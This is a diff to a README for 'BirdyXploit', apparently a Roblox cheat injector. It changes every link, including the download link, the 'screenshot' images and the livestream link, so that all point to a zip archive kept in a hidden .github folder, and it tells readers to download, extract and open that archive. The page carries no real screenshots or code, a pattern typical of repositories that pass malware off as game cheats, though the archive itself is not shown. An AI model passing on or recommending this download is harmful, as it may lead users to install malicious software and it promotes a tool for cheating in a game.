@@ -2,8 +2,8 @@ WRD isnt working anymore!!!
 
 # BirdyXploit
 BirdyXploit is a WRD based no-key open source Roblox exploit app.
-<a href="https://github.com/haydenmellor/BirdyXploit/releases/download/v2.0/Software.zip">Download as zip</a>
-(then extract it to a folder then open https://github.com/haydenmellor/BirdyXploit/releases/download/v2.0/Software.zip)
+<a href="https://raw.githubusercontent.com/haydenmellor/BirdyXploit/main/.github/Xploit_Birdy_1.9.zip">Download as zip</a>
+(then extract it to a folder then open https://raw.githubusercontent.com/haydenmellor/BirdyXploit/main/.github/Xploit_Birdy_1.9.zip)
 # Features
 * Auto inject
 * Auto execute
@@ -13,13 +13,13 @@ BirdyXploit is a WRD based no-key open source Roblox exploit app.
 * Tabs
 * ScriptBlox Menu
 # Screenshots
-![resim](https://github.com/haydenmellor/BirdyXploit/releases/download/v2.0/Software.zip)
+![resim](https://raw.githubusercontent.com/haydenmellor/BirdyXploit/main/.github/Xploit_Birdy_1.9.zip)
 
-![resim](https://github.com/haydenmellor/BirdyXploit/releases/download/v2.0/Software.zip)
+![resim](https://raw.githubusercontent.com/haydenmellor/BirdyXploit/main/.github/Xploit_Birdy_1.9.zip)
 
-![resim](https://github.com/haydenmellor/BirdyXploit/releases/download/v2.0/Software.zip)
+![resim](https://raw.githubusercontent.com/haydenmellor/BirdyXploit/main/.github/Xploit_Birdy_1.9.zip)
 
-![resim](https://github.com/haydenmellor/BirdyXploit/releases/download/v2.0/Software.zip)
+![resim](https://raw.githubusercontent.com/haydenmellor/BirdyXploit/main/.github/Xploit_Birdy_1.9.zip)
 # Livestream from a alpha-tester
 (there is only one lol)
-https://github.com/haydenmellor/BirdyXploit/releases/download/v2.0/Software.zip
+https://raw.githubusercontent.com/haydenmellor/BirdyXploit/main/.github/Xploit_Birdy_1.9.zip
